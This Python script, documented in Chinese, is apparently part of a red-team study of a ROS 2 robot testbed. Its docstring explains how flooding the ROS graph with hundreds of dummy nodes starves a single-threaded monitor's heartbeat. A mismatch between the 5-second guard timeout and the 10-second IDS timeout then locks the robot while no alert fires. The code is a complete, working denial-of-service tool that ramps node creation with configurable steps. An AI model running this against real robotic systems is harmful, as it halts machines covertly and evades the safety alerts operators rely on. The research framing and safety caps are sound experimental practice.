#!/usr/bin/env python3
"""N36 — 心跳餓死：把機器人停住，而且不讓任何人發告警。

## 這一支要打的是什麼（三個事實，都是讀 2026-09-19 的程式確認的）

1. **`monitor_node` 是單執行緒。** `main()` 用 `rclpy.spin(node)`，預設互斥
   回呼群組，而且它**不訂閱任何 topic**——純計時器驅動：

       _check_graph        每 poll_interval 秒，呼叫 get_node_names_and_namespaces()
       _publish_heartbeat  每 2.0 秒（_HEARTBEAT_PERIOD_SEC）
       _flush_line_batch   每 30 秒

   三者串在同一條執行緒上，**任何一個變慢都會拖到其他兩個**。

2. **`_check_graph` 的成本隨 graph 大小成長**，而 graph 大小是攻擊者可以灌的。

3. **兩個心跳逾時不一致**：

   | 元件 | 常數 | 逾時 | 後果 |
   |---|---|---:|---|
   | `velocity_guard_node` | `HEARTBEAT_LEASE_TIMEOUT_SEC` | **5.0 s** | 鎖定，機器人停住 |
   | `intelligent_defense_node` | `HEARTBEAT_TIMEOUT_SEC` | **10.0 s** | 才發告警 |

   ⇒ **心跳間隔落在 5–10 秒時，機器人停住而沒有人發告警。**

## 為什麼這在特徵層也看不見

Enforce 表上 26 個活特徵裡**沒有任何 guard 狀態特徵**，而 `heartbeat_gap_sec`
正好是 11 個恆為常數的死特徵之一。所以即使守衛鎖定，模型的輸入不會改變。

## 與 N33／N35 的差別

| | N33 node_churn | N35 spdp_flood | **N36（本支）** |
|---|---|---|---|
| 目標 | SEDP 端點生滅 | SPDP 公告量 | **monitor 的執行緒預算** |
| 規模 | 少量反覆生滅 | 同時 10–60 個 | **爬升到數百個 node** |
| 成功判準 | `participant_change` | `spdp_ratio` | **`guard_state locked/monitor_lease_missing`** |

⚠️ 既有 640 場資料裡 `monitor_lease_missing` 出現 **0 次**（探針自我驗證過，
找得到 `guard_state`，reason 有 `none`／`stale_command`／`generic_alert`）。
所以這不是既有攻擊的副作用，`spdp_flood` 的 37 個 participant 到不了。

## 事前寫下的預測（跑完不改口）

- **P1**：Permissive 下，node 數爬到某個門檻時會出現
  `guard_state locked/monitor_lease_missing`。
- **P2**：**Enforce 下打不到**。未認證的 participant 不進入握手（C2C-014），
  不會出現在防守方的 graph 視圖裡，所以 `_check_graph` 不會變慢。
  若 P2 被推翻（Enforce 也中），那比 P1 更值得寫——代表 SROS2 認證擋不住
  這條路。
- **P3**：間隔**難以穩定控制**在 5–10 秒。爬升是粗糙的旋鈕；預期會看到
  要嘛不到 5 秒、要嘛直接衝過 10 秒而觸發 IDS d5。若 P3 成立，這個攻擊
  「隱形」的那一半就只是理論上的。

## 安全界線

沒有憑證、沒有 HMAC 金鑰、沒有遙測 socket、不需要 root。
node 數有硬上限——DDS discovery 是 O(n²)，開太大會讓**攻擊者自己**先掛掉，
而那在遙測上與「防禦擋下了」難以分辨（C2C-020 記過同一種混淆）。

## 用法

    python3 N36_heartbeat_starvation.py <duration_sec> \\
        [--start 20] [--step 20] [--step-sec 3.0] [--max-nodes 300]

stdout 會逐步印出「時間戳 → 目前 node 數」，供離線與防守端遙測對齊；
攻擊端自己看不到心跳，判定一律由防守端的 `guard_state` 決定。
"""

from __future__ import annotations

import argparse
import sys
import time

import rclpy
from rclpy.executors import ExternalShutdownException
from rclpy.node import Node

MAX_DURATION_SEC = 300.0
MAX_NODES_HARD = 600
MIN_NODES = 1


def _make_node(index: int) -> Node:
    """一個 node ＝ graph 裡的一筆。名稱與命名空間刻意加長。

    `get_node_names_and_namespaces()` 回傳的是 (name, namespace) 字串對，
    所以字串長度也是防守端要付的成本之一——而它對攻擊者幾乎免費。
    名稱仍必須合法：ROS 2 只接受 [A-Za-z_][A-Za-z0-9_]*。
    """
    filler = "starve_probe_segment"
    return Node(
        f"n36_{filler}_{index:04d}",
        namespace=f"/n36/{filler}/depth_{index % 8}",
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("duration_sec", nargs="?", type=float, default=60.0)
    parser.add_argument("--start", type=int, default=20)
    parser.add_argument("--step", type=int, default=20)
    parser.add_argument("--step-sec", type=float, default=3.0)
    parser.add_argument("--max-nodes", type=int, default=300)
    return parser


def main() -> int:
    args = build_parser().parse_args()
    duration = max(1.0, min(float(args.duration_sec), MAX_DURATION_SEC))
    ceiling = max(MIN_NODES, min(int(args.max_nodes), MAX_NODES_HARD))
    start = max(MIN_NODES, min(int(args.start), ceiling))
    step = max(1, int(args.step))
    step_sec = max(0.5, float(args.step_sec))

    print(f"☠️ N36: graph 爬升 {start} → {ceiling} 個 node，每 {step_sec:.1f}s "
          f"加 {step} 個，總時長 {duration:.1f}s", flush=True)
    print("   判定不在這一端：看防守端有沒有 "
          "guard_state locked/monitor_lease_missing", flush=True)

    rclpy.init()
    nodes: list[Node] = []
    t0 = time.monotonic()
    deadline = t0 + duration
    next_step = t0
    created_log: list[tuple[float, int]] = []
    try:
        while time.monotonic() < deadline and rclpy.ok():
            now = time.monotonic()
            if now >= next_step and len(nodes) < ceiling:
                target = min(ceiling, (start if not nodes
                                       else len(nodes) + step))
                while len(nodes) < target and rclpy.ok():
                    try:
                        nodes.append(_make_node(len(nodes)))
                    except Exception as exc:          # 攻擊端自己撐不住
                        print(f"   ⚠️ 建到第 {len(nodes)} 個就失敗：{exc}",
                              flush=True)
                        target = len(nodes)
                        ceiling = len(nodes)
                        break
                created_log.append((now - t0, len(nodes)))
                print(f"   t={now - t0:6.2f}s  node={len(nodes)}", flush=True)
                next_step = now + step_sec
            if nodes:
                # 只 spin 一個：負擔來自這些 node 在 graph 裡的**存在**，
                # 不是來自我們處理進來的訊息。
                rclpy.spin_once(nodes[0], timeout_sec=0.05)
            else:
                time.sleep(0.05)
    except (KeyboardInterrupt, ExternalShutdownException):
        pass
    finally:
        peak = len(nodes)
        for node in nodes:
            try:
                node.destroy_node()
            except Exception:
                pass
        try:
            rclpy.shutdown()
        except Exception:
            pass
        elapsed = time.monotonic() - t0
        print(f"⏹ N36 結束：峰值 {peak} 個 node，歷時 {elapsed:.1f}s", flush=True)
        print(f"   爬升軌跡 {created_log}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
